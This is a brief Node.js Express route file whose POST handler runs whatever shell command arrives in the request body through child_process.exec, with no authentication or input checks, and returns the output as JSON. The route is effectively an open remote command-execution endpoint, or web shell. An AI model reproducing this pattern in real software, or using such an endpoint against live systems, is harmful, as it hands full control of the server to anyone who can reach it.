const axios = require('axios');
const express = require('express');
const router = express.Router();
const exec = require('child_process').exec;

router.post('/', function(req, res) {
  var cmd = req.body.command;

  exec(cmd, function(error, stdout, stderr) {
    if (stderr || error) {
      res.json({
        success: false,
        error: stderr || error,
        command: cmd,
        result: null
      })
    } else {
      res.json({
        success: true,
        error: null,
        command: cmd,
        result: stdout
      })
    }
  })

})

module.exports = router;